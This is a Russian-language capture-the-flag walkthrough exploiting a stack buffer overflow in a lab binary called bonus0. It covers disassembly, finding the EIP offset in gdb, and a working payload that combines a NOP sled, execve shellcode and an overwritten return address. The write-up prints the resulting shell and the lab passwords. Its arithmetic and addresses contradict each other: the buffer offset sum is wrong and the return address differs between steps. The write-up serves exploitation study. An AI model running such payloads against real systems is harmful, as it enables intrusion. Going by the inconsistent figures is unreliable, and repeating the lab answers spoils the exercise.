## HowTo
```
su bonus0
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

### Инструменты:
- Ida Pro + hex rays
- peda (gdb + patterns)

### Анализ и ход решения
1. Запуск `./bonus0` требует ввода двух аргументов, после чего оба аргумента выводится в виде конкатенированной строки.
Передачи длинных строк приводит в `segmentation fault`

2. Используем IdaPro, дизасемблируем и получаем си-псевдокод. Находим две интересующие нас функции, вызываемые из `main`
```
char *__cdecl pp(char *dest)
{
  char src; // [esp+28h] [ebp-30h]
  char v3; // [esp+3Ch] [ebp-1Ch]

  p(&src, " - ");
  p(&v3, " - ");
  strcpy(dest, &src);
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4;
  return strcat(dest, &v3);
}
```
```
char *__cdecl p(char *dest, char *s)
{
  char buf; // [esp+10h] [ebp-1008h]

  puts(s);
  read(0, &buf, 0x1000u);
  *strchr(&buf, 10) = 0;
  return strncpy(dest, &buf, 0x14u);
}
```
3. Анализ функций
- `pp()` дважды вызывает `p()` для чтения аргументов
- `p()` читает `4096 байт`, после чего возвращает `20 байт` из прочитанного буфера используя `strncpy`
- `strncpy` возвращает не терминированную строку в случае, если `src > dest`
```
Из мана strncpy
"If the source string has a size greater than that specified in parameter, then the produced string will not be terminated by null ASCII code (character '\0')."
```
- в конце `pp()` использует `strcpy` для возврата - копируется буффер, возвращаемый из `strncpy` - он может быть не терминирован
- в случае не терминированной строки 1-й аргумент может быть продлен по стеку. Это приводит к переполненю буфера, перезаписи адрес возврата `EIP` и `Segmentation Fault`

### Логика взлома
положить shell code в 1-й аргумент, используя переполнение, затем подменить адрес возврата `eip` 2-го аргумента адресом нашего `shell code`

4. Находим адрес `eip` - используем `Buffer Overflow EIP Offset String Generator` 

https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

```
payload для 1-го аргумента
01234567890123456789
```
```
payload для 2-го аргумента
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9...
```
```
eip address
0x41336141
```
С помощью генератора находим `offset == 9`

5. Находим адрес буфера, куда нам нужно положить `shell code`
```
> gdb ./bonus0
> disass p
...
=> 0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
...

> b *p+28

> run
Breakpoint 2, 0x080484d0 in p ()
> x $ebp-0x1008
0xffffb9b0:	0x00000000
```

6. Начало буфера - `0xffffb9b0`. Мы хотим перезаписать буфер с некоторым смещением и положить в него наш код. Эксперементально - пробуем `100 байт`. 
Старт буффера `0xffffb9b0 + 100 = 0xbfffe6a4`

7. Находим `shell code` http://shell-storm.org/shellcode/files/shellcode-827.php
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

8. Собираем payload для каждого из аргументов
#### Аргумент 1
- NOP bytes sequence `0x90`
- Собираем большой слайс с NOP-instruction, дополняя его `shell code`
```
'\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```
#### Аргумент 2
- смещение до `EIP (9) -> 'A' * 9`
- адрес в слайсе NOP-инструкций, за которым следует `shell-code = 0xbfffe6a4 -> '\xa4\xe6\xff\xdf'` (`4` байта)
- дополнение 7 байт до размера копируемого буфера 20 байт - `'A' * 7`
```
'A' * 9 + '\xa4\xe6\xff\xdf' + 'A' * 7
```
9. Итоговый payload для двух агрументов
```
(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('A' * 9 + '\xa4\xe6\xff\xbf' + 'A' * 7)"; cat) | ~/bonus0

whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
